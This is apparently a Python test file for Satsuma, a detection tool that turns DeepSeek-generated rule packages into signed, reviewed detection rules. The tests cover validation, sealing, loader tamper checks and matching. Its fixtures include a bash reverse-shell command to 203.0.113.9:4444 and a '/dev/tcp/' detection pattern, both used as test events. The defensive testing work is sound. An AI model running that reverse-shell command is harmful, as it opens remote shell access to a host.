"""A DeepSeek reply becomes a working Satsuma rule, end to end (2.2.18).

The model is told to omit detection_sha256 (it cannot hash canonical bytes);
Satsuma adds it locally. These replies follow the prompt exactly and must pass
the transport schema, the package validator, the isolated engine test, the
signed activation and the real loader, and then catch only their own event.

Bir DeepSeek yanıtı uçtan uca çalışan bir Satsuma kuralına dönüşür (2.2.18):
taşıma şeması, paket doğrulayıcı, yalıtılmış motor testi, imzalı aktivasyon ve
gerçek yükleyiciden geçer; yalnızca kendi olayını yakalar.
"""
import copy
import json

import pytest
from jsonschema import Draft202012Validator

from satsuma import ai_rule_package as pkg, rule_adapter as adapter
from satsuma.smart_rules import SmartRuleEngine
from test_deepseek_secure_workflow import gpg_key, store, trusted  # noqa: F401  (pytest fixtures)

CONFIG = {'rule_adapter_enabled': True, 'deepseek_enabled': True}


def reply(rule_id, base_match, positive, negative, wrong_source, action='process_kill', target='process'):
    """What the prompt asks DeepSeek for: a package without detection_sha256."""
    rule = {'schema_version': 1, 'id': rule_id, 'name': 'Model önerisi', 'severity': 'high',
            'classification': 'suspicious', 'confidence': 'medium', 'implementation_status': 'CURRENT_TELEMETRY',
            'proof_level': 'PUBLIC_RESEARCH', 'base_match': base_match,
            'actions': ['record', 'evidence', 'correlation_request']}
    return {'package_version': 1, 'rule_id': rule_id, 'rule_version': 1, 'detection': rule,
            'response_proposal': {'schema_version': 1, 'rule_id': rule_id, 'rule_version': 1,
                'requested_action': action, 'target_type': target,
                'execution': 'requires_policy_authorization', 'evidence_required': True, 'operator_review': True,
                'minimum_sources': 2, 'required_sources': [base_match['source'], 'audit'],
                'verification_level': 'fresh_independent_same_target_records',
                'policy_preconditions': ['operator_authorization', 'existing_response_policy', 'target_identity',
                                         'protected_target_exemptions'],
                'conditions': ['fresh process identity and independent evidence'],
                'impact': 'Süreç durabilir', 'rollback': 'Süreç sonlandırma geri alınamaz'},
            'test_cases': {'positive': [positive], 'negative': [negative], 'wrong_source': [wrong_source]}}


PROCESS = reply('SATSUMA-AI-REVSHELL-001', {'source': 'sys_proc', 'cmd_arg_contains': ['/dev/tcp/']},
                {'source': 'sys_proc', 'cmd': 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'},
                {'source': 'sys_proc', 'cmd': 'ls -la /tmp'},
                {'source': 'dns', 'cmd': 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'})
MEMORY = reply('SATSUMA-AI-MEMFD-001', {'source': 'memory', 'action': 'memfd_executable'},
               {'source': 'memory', 'action': 'memfd_executable'},
               {'source': 'memory', 'action': 'anonymous_rwx'},
               {'source': 'sys_proc', 'action': 'memfd_executable'})


def test_transport_schema_sent_to_deepseek_is_valid_and_omits_the_digest():
    schema = json.loads(adapter.SCHEMA_HINT)
    Draft202012Validator.check_schema(schema)
    assert 'detection_sha256' not in schema['properties']['response_proposal']['required']
    for raw in (PROCESS, MEMORY):
        assert not list(Draft202012Validator(schema).iter_errors(raw)), raw['rule_id']


@pytest.mark.parametrize('raw', [PROCESS, MEMORY], ids=['process', 'memory'])
def test_generated_reply_passes_validation_and_isolated_engine(raw, store, monkeypatch):
    monkeypatch.setattr(adapter, 'generate_rule', lambda *a, **k: copy.deepcopy(raw))
    result = adapter.research_and_generate(store, 'T1059.004', 'reverse_shell', CONFIG, confirmed=True)
    assert result['status'] == 'generated' and result['errors'] == [], result['errors']
    package = result['package']
    assert package['response_proposal']['detection_sha256'] == pkg.digest(package['detection'])
    tested = pkg.test_package(package)
    assert tested['passed'] and tested['actions_safe'], tested


@pytest.mark.parametrize('raw', [PROCESS, MEMORY], ids=['process', 'memory'])
def test_generated_rule_is_signed_activated_and_catches_only_its_event(raw, store, trusted, monkeypatch):
    sign, active = trusted
    monkeypatch.setattr(adapter, 'generate_rule', lambda *a, **k: copy.deepcopy(raw))
    package = adapter.research_and_generate(store, 'T1059.004', 'reverse_shell', CONFIG, confirmed=True)['package']
    assert adapter.queue_package(store, package, authorized=True, reviewer=1000)['queued']
    approved = adapter.approve_rule(store, package['rule_id'], authorized=True, reviewer=1000)
    payload = approved['signing_payload'] if 'signing_payload' in approved else approved['payload']
    assert adapter.verify_rule_signature(store, package['rule_id'], sign(payload.encode()), authorized=True)['valid']
    activated = adapter.activate_rule(store, package['rule_id'], authorized=True, reviewer=1000)
    assert activated['activated'] and activated['loader_verified']
    engine = SmartRuleEngine(active)
    assert not engine.load_errors
    hits = lambda event: [f for f in engine.match(dict(event, id='e2e')) if f['rule_id'] == package['rule_id']]
    assert hits(package['test_cases']['positive'][0])
    assert not hits(package['test_cases']['negative'][0])
    assert not hits(package['test_cases']['wrong_source'][0])
    # The proposal travels with the finding; executing it stays a separate, authorized step.
    assert hits(package['test_cases']['positive'][0])[0]['response_proposal']['requested_action'] == 'process_kill'


@pytest.mark.parametrize('change', ['ticket_action', 'unimplemented_memory_action', 'no_matcher'])
def test_replies_the_program_cannot_run_are_refused(change, store, monkeypatch):
    raw = copy.deepcopy(PROCESS if change != 'unimplemented_memory_action' else MEMORY)
    if change == 'ticket_action':
        raw['detection']['actions'].append('ticket')
    if change == 'unimplemented_memory_action':
        raw['detection']['base_match']['action'] = 'kernel_rootkit_magic'
    if change == 'no_matcher':
        raw['detection']['base_match'] = {'source': 'sys_proc'}
    monkeypatch.setattr(adapter, 'generate_rule', lambda *a, **k: copy.deepcopy(raw))
    result = adapter.research_and_generate(store, 'T1059.004', 'reverse_shell', CONFIG, confirmed=True)
    assert result['status'] == 'validation_failed' and result['errors']


def test_prompt_explains_the_exact_matchers():
    from satsuma import deepseek_client as client
    sent = {}
    client_request = client._request
    try:
        client._request = lambda prompt, config, confirmed, **k: sent.setdefault('prompt', prompt)
        client.generate_rule('T1059.004', 'reverse_shell', adapter.SCHEMA_HINT, {}, confirmed=True)
    finally:
        client._request = client_request
    assert 'cmd_arg_contains' in sent['prompt'] and 'not substrings' in sent['prompt']


def test_a_substring_guess_in_cmd_contains_is_caught_before_queueing(store, monkeypatch):
    """The isolated engine test refuses a rule that misses its own positive event."""
    raw = copy.deepcopy(PROCESS)
    raw['detection']['base_match'] = {'source': 'sys_proc', 'cmd_contains': ['/dev/tcp/']}
    monkeypatch.setattr(adapter, 'generate_rule', lambda *a, **k: copy.deepcopy(raw))
    package = adapter.research_and_generate(store, 'T1059.004', 'reverse_shell', CONFIG, confirmed=True)['package']
    assert pkg.test_package(package)['passed'] is False


def test_field_reply_without_proposal_and_with_action_list_becomes_reviewable(store, monkeypatch):
    """Field reply 2026-11-04: no response_proposal and base_match.action as a list."""
    raw = copy.deepcopy(MEMORY)
    del raw['response_proposal']
    raw['detection']['base_match']['action'] = ['memfd_executable', 'memfd_mapping']
    raw['test_cases']['negative'] = [{'source': 'memory', 'action': 'anonymous_rwx'}]
    monkeypatch.setattr(adapter, 'generate_rule', lambda *a, **k: copy.deepcopy(raw))
    result = adapter.research_and_generate(store, 'T1620', 'defense_evasion', CONFIG, confirmed=True)
    assert result['errors'] == [] and result['status'] == 'generated', result['errors']
    assert result['completed_locally'] == ['response_proposal_missing_observe_only_added']
    proposal = result['package']['response_proposal']
    assert proposal['requested_action'] == 'record' and proposal['target_type'] == 'none'  # never an invented action
    assert pkg.test_package(result['package'])['passed']


def test_memory_action_list_with_an_unimplemented_action_is_refused():
    rule = copy.deepcopy(MEMORY['detection'])
    rule['base_match']['action'] = ['memfd_executable', 'kernel_magic']
    assert 'memory telemetry action is not implemented' in pkg.validate_detection(rule)


def test_field_package_2026_11_04_validates_after_binding_and_scoring_is_explained():
    """The real DeepSeek package: digest omitted, advisory target 'process', unsupported scoring."""
    import pathlib
    field = json.loads((pathlib.Path(__file__).parent / 'fixtures/deepseek-field-package-20261104.json').read_text())
    package = pkg.bind_detection_digest(copy.deepcopy(field))
    errors = pkg.validate_package(package)
    assert errors and all(e.startswith('unsupported_scoring_condition: action ==') for e in errors), errors
    for key in ('scoring', 'threshold', 'base_score'):
        package['detection'].pop(key)
    package['response_proposal'].pop('detection_sha256')
    package = pkg.bind_detection_digest(package)
    assert pkg.validate_package(package) == []
    assert pkg.test_package(package)['passed']


@pytest.fixture
def sealed(tmp_path, monkeypatch):
    """Local seal key like /etc/satsuma-core/trust/manifest.key; no GPG key at all."""
    import os
    from satsuma import rule_signing
    key = tmp_path / 'manifest.key'
    key.write_bytes(b'k' * 32)
    os.chmod(key, 0o600)
    monkeypatch.setattr(rule_signing, 'SEAL_KEY', key)
    monkeypatch.setattr(rule_signing, 'TRUSTED_OWNER', os.getuid())
    monkeypatch.setattr(rule_signing, 'TRUSTED_PUBLIC_KEY', tmp_path / 'no-gpg-key.gpg')
    active = tmp_path / 'active'
    monkeypatch.setattr(adapter, 'ACTIVE_RULES_DIR', active)
    monkeypatch.setattr(rule_signing, 'MANAGED_RULES_DIR', active)
    monkeypatch.setattr(adapter, 'TRUSTED_OWNER', os.getuid(), raising=False)
    return active


def test_approval_seals_and_activates_without_gpg(store, sealed, monkeypatch):
    monkeypatch.setattr(adapter, 'generate_rule', lambda *a, **k: copy.deepcopy(PROCESS))
    package = adapter.research_and_generate(store, 'T1059.004', 'reverse_shell', CONFIG, confirmed=True)['package']
    assert adapter.queue_package(store, package, authorized=True, reviewer=1000)['queued']
    approved = adapter.approve_rule(store, package['rule_id'], authorized=True, reviewer=1000)
    assert approved['status'] == 'signed' and approved['sealed']
    activated = adapter.activate_rule(store, package['rule_id'], authorized=True, reviewer=1000)
    assert activated['activated'] and activated['loader_verified'], activated
    engine = SmartRuleEngine(sealed)
    assert not engine.load_errors
    assert [f for f in engine.match(dict(package['test_cases']['positive'][0], id='s')) if f['rule_id'] == package['rule_id']]


def test_a_changed_sealed_rule_is_refused_by_the_loader(store, sealed, monkeypatch):
    monkeypatch.setattr(adapter, 'generate_rule', lambda *a, **k: copy.deepcopy(PROCESS))
    package = adapter.research_and_generate(store, 'T1059.004', 'reverse_shell', CONFIG, confirmed=True)['package']
    adapter.queue_package(store, package, authorized=True, reviewer=1000)
    adapter.approve_rule(store, package['rule_id'], authorized=True, reviewer=1000)
    assert adapter.activate_rule(store, package['rule_id'], authorized=True, reviewer=1000)['activated']
    payload = sealed / package['rule_id'] / 'package.json'
    payload.write_bytes(payload.read_bytes().replace(b'Model', b'Mode1'))
    assert SmartRuleEngine(sealed).load_errors  # seal no longer matches
